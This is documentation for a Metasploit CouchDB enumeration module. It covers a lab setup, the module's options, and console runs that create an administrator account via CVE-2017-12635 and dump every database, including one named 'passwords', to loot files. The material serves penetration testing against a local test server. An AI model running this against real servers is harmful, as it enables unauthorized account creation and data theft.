## Vulnerable Application

Apache CouchDB is a nosql database server which communicates over HTTP.  This module will enumerate the server and databases hosted on it.

The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https://www.1and1.com/cloud-community/learn/database/couchdb/install-and-use-couchdb-on-ubuntu-1604/):
  
  1. `sudo apt install software-properties-common`
  2. `sudo add-apt-repository ppa:couchdb/stable`
  3. `sudo apt update`
  4. `sudo apt install couchdb`
  5. Reconfigure couchdb to listen to all interfaces. Edit `/etc/couchdb/local.ini`. Under `[httpd]` add the following line: `bind_address = 0.0.0.0`
  6. Restart the service: `sudo service couchdb restart`

## Verification Steps

  1. Install and configure couchdb
  2. Start msfconsole
  3. Do: `auxiliary/scanner/couchdb/couchdb_enum`
  4. Do: `run`

## Options

  **serverinfo**

  If set to true, the server info will also enumerated and set in msf's DB.  Defaults to `false`

  **createuser**

  If set to true, the server info will attempt to create an account in CouchDB using configured credentials (limited to CVE-2017-12635 conditions). Defaults to `false`

## Scenarios

  A run against the configuration from these docs

  ```
  msf5 auxiliary(scanner/afp/afp_login) > use auxiliary/scanner/couchdb/couchdb_enum 
  msf5 auxiliary(scanner/couchdb/couchdb_enum) > set rhosts 1.1.1.1
  rhosts => 1.1.1.1
  msf5 auxiliary(scanner/couchdb/couchdb_enum) > set verbose true
  verbose => true
  msf5 auxiliary(scanner/couchdb/couchdb_enum) > run
  
  [+] 1.1.1.1:5984 {
    "couchdb": "Welcome",
    "uuid": "6f08e89795bd845efc6c2bf3d57799e5",
    "version": "1.6.1",
    "vendor": {
      "version": "16.04",
      "name": "Ubuntu"
    }
  }
  [*] #{peer} Enumerating Databases...
  [+] 1.1.1.1:5984 Databases:
  
  [
    "_replicator",
    "_users"
  ]
  
  [+] 1.1.1.1:5984 File saved in: /root/.msf4/loot/20180721105522_default_1.1.1.1_couchdb.enum_888970.bin
  
  msf5 auxiliary(scanner/couchdb/couchdb_enum) > services
  Services
  ========
  
  host           port  proto  name     state  info
  ----           ----  -----  ----     -----  ----
  1.1.1.1  5984  tcp    couchdb  open   HTTP/1.1 200 OK
  Server: CouchDB/1.6.1 (Erlang OTP/18)
  Date: Sat, 21 Jul 2018 14:54:45 GMT
  Content-Type: text/plain; charset=utf-8
  Content-Length: 127
  Cache-Control: must-revalidate
  
  {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}

  Standard versus with credential creation
  ========================================
  msf > use auxiliary/scanner/couchdb/couchdb_enum
  msf auxiliary(scanner/couchdb/couchdb_enum) > set rhost localhost
  rhost => localhost
  msf auxiliary(scanner/couchdb/couchdb_enum) > exploit

  [*] localhost:5984 Enumerating Databases...
  [+] localhost:5984 Databases:

  [
    "_global_changes",
    "_metadata",
    "_replicator",
    "_users",
    "passwords",
    "simpsons"
  ]

  [+] localhost:5984 File saved in: /root/.msf4/loot/20180915211454_default_1_couchdb.enum_214468.bin
  [-] Error retrieving database. Consider providing credentials.
  [*] Auxiliary module execution completed

  msf auxiliary(scanner/couchdb/couchdb_enum) > set createuser true
  createuser => true
  msf auxiliary(scanner/couchdb/couchdb_enum) > exploit

  [+] Found CouchDB version 2.0.0
  [+] User mlmUdhNZzDlI created with password password. Connect to http://localhost:5984/_utils/ to login.
  [*] localhost:5984 Enumerating Databases...
  [+] localhost:5984 Databases:

  [
    "_global_changes",
    "_metadata",
    "_replicator",
    "_users",
    "passwords",
    "simpsons"
  ]

  [+] localhost:5984 File saved in: /root/.msf4/loot/20180915194926_default_1_couchdb.enum_131803.bin
  [+] localhost:5984 _global_changes saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._global__824779.bin
  [+] localhost:5984 _metadata saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._metadat_584893.bin
  [+] localhost:5984 _replicator saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._replica_443706.bin
  [+] localhost:5984 _users saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._users_870736.bin
  [+] localhost:5984 passwords saved in: /root/.msf4/loot/20180915194926_default_1_couchdb.password_458174.bin
  [+] localhost:5984 simpsons saved in: /root/.msf4/loot/20180915194926_default_1_couchdb.simpsons_842642.bin
  [*] Auxiliary module execution completed

  msf auxiliary(scanner/couchdb/couchdb_enum) > set httpusername mlmUdhNZzDlI
  httpusername => mlmUdhNZzDlI
  msf auxiliary(scanner/couchdb/couchdb_enum) > set httppassword password
  httppassword => password
  msf auxiliary(scanner/couchdb/couchdb_enum) > show options

  Module options (auxiliary/scanner/couchdb/couchdb_enum):

     Name          Current Setting  Required  Description
     ----          ---------------  --------  -----------
     CREATEUSER    true             yes       Create Administrative user - 
     HttpPassword  password         yes       CouchDB Password
     HttpUsername  mlmUdhNZzDlI     yes       CouchDB Username
     Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOST         localhost        yes       CouchDB Host
     ROLES         _admin           yes       CouchDB Roles
     RPORT         5984             yes       CouchDB Port
     SERVERINFO    false            yes       Print server info
     SSL           false            no        Negotiate SSL/TLS for outgoing connections
     TARGETURI     /_all_dbs        yes       Path to list all the databases
     VHOST                          no        HTTP server virtual host

  msf auxiliary(scanner/couchdb/couchdb_enum) > set createuser false
  createuser => false
  msf auxiliary(scanner/couchdb/couchdb_enum) > exploit

  [*] localhost:5984 Enumerating Databases...
  [+] localhost:5984 Databases:

  [
    "_global_changes",
    "_metadata",
    "_replicator",
    "_users",
    "passwords",
    "simpsons"
  ]

  [+] localhost:5984 File saved in: /root/.msf4/loot/20180915211215_default_1_couchdb.enum_460766.bin
  [+] localhost:5984 _global_changes saved in: /root/.msf4/loot/20180915211215_default_1_couchdb._global__821328.bin
  [+] localhost:5984 _metadata saved in: /root/.msf4/loot/20180915211215_default_1_couchdb._metadat_410831.bin
  [+] localhost:5984 _replicator saved in: /root/.msf4/loot/20180915211215_default_1_couchdb._replica_599375.bin
  [+] localhost:5984 _users saved in: /root/.msf4/loot/20180915211216_default_1_couchdb._users_827774.bin
  [+] localhost:5984 passwords saved in: /root/.msf4/loot/20180915211216_default_1_couchdb.password_361950.bin
  [+] localhost:5984 simpsons saved in: /root/.msf4/loot/20180915211217_default_1_couchdb.simpsons_138031.bin
  [*] Auxiliary module execution completed
  msf auxiliary(scanner/couchdb/couchdb_enum) > 

  ```
